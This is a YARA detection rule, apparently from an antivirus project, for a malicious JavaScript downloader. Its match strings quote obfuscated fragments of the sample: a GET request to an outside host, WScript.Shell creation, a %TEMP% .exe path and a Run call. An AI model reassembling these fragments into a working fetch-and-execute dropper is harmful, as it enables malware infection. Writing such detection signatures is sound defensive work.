rule sig_20160401_369919ac8b716a922b03f95beda89cc8 {
  meta:
    description = "datamaliciousorder - file 20160401_369919ac8b716a922b03f95beda89cc8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ab73e1f8e6d62442e764dbca778d2e6a5d94d2605e2a4a3a7ff7f45b9e87ced9"

  strings:
    $s1  = "LesYp[ReXtc](\"G\" + \"ET\", \"http://echo-gs.net/h6dskl\", false);" fullword ascii
    $s2  = "var FnJs = function CeDe() {return WScript[NkNxm](\"WScript\"+\".Shell\");}(), ShZd = 11;" fullword ascii
    $s3  = "function JeRg(OcrWy, AcfCi){SarRz = SarRz * 1; return OcrWy - AcfCi;};" fullword ascii
    $s4  = "if (LesYp[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function QagRtb(){return ZiqRu + \"\";};" fullword ascii
    $s6  = "function FnzVj() {return FnJs[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Dp7d4OEC.ex\" + \"e\";};" fullword ascii
    $s7  = "function ArPm() {return ((BskJpk == true) && (BskJpk == CiCwv)) ? 1 : SarRz;};" fullword ascii
    $s8  = "return JeRg(AipXh, TzuKbm);" fullword ascii
    $s9  = "function ZzRe(CiYmp) {var QxIcs = (1, 2, 3, 4, 5, CiYmp); return QxIcs;};" fullword ascii
    $s10 = "var BskJpk = false;" fullword ascii
    $s11 = "function XwgEp()" fullword ascii
    $s12 = "CiCwv = true; " fullword ascii
    $s13 = "var OyMjj = new this[\"Date\"]();" fullword ascii
    $s14 = "}while (CnQbq);" fullword ascii
    $s15 = "function OnmPu(){return NkNxm;};" fullword ascii
    $s16 = "function ZsrTw(){return 23;};" fullword ascii
    $s17 = "var CiCwv = false;" fullword ascii
    $s18 = "BskJpk = true; " fullword ascii
    $s19 = "function AiNsg(EldKy){FnJs[\"R\"+\"un\"](EldKy, SarRz, SarRz);};" fullword ascii
    $s20 = "var EhaRuv = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}